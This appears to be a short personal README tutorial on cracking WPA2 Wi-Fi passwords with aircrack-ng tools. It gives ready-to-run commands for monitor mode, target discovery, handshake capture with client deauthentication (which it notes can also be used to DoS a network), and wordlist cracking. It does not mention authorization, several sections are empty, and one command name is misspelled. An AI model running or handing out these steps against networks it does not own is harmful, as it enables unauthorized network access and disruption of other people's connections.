# Wifi-hacking

## Table of content

- [hardware](#hardware)
- [tools](#tools)
  - [aircrack ng](#aircrack-ng)
  - [airmon ng](#airmon-ng)
  - [airodump ng](#airodump-ng)
  - [wifite](#wifite)
- [cracking manualy with aircrack tools](#cracking-manualy-with-aircrack-tools)
  - [kill processes](#kill-processes)
  - [interface to monitor mode](#interface-to-monitor-mode)
  - [discover wifi](#discover-wifi)
  - [view just the target](#view-just-the-target)
  - [capture WPA2 handshake plus deauthenticate](#capture-WPA2-handshake-plus-deauthenticate)
  - [cracking the handshake](#cracking-the-handshake)
  - [](#)
  - [](#)
  - [](#)
  - [](#)
  
  

  
### hardware
  
my recommended use is Alfa AWUS036ACH-C
  
example site:
```
https://cdon.se/hemelektronik/alfa-awus036ach-c-p85144443?gclid=Cj0KCQjwof6WBhD4ARIsAOi65ajClanJarTELWA8x2m-jddNlS2pyJNLfaKC6foh1Ex3yA0PkQHw674aAoA8EALw_wcB
```
  
### tools 
  
## aircrack ng
  
## airmon ng
  
## airodump-ng
  
## wifite
  
## cracking manualy with aircrack tools
### kill processes
killing the processes that may interfere
```
sudo airmon-ng check kill
```

### interface to monitor mode
to put the interface/adapter to monitor mode type:
```
sudo airmon-ng start <interface>
```

### discover wifi
to search and find wifi in the area type:
```
sudo airodump-ng <interface>
```
then you should find the wifi you want to target and write up
*   BSSID (it is the mac address)
*   Channel (CH)

### view just the target
to see just the target type:
```
sudo airodump-ng <interface> -d <BSSID>
```
then you can see info about the target
plsu you can see clients connected to the network


### capture WPA2 handshake plus deauthenticate
now you will capture the WPA2 handshake. type:
```
sudo airodump-ng -w <name of the file you want to name for the capture> --bssid <BSSID> <interface>
```
press enter
then at the same time after entered the capture and letting it go we will go on and open a second window/terminal we will deauthenticate clients from the network by typing:
```
sudo aireplay-ng --deauth 0 -a <BSSID> <interface>
```
(ops the deauth part can sometimes be used to Ddos a wifi network)

then after a while the handshake should be captured

### cracking the handshake
we should have a file which ends with ".pcap" 
we have to put the adapter which is on monitor mode back to manage mode by typing: 
```
sudo airomon-ng stop <interface>
``` 
now its time to crack the .pcap file
```
aircrack-ng <the pcap file> -w <wordlist to crack the password>
```



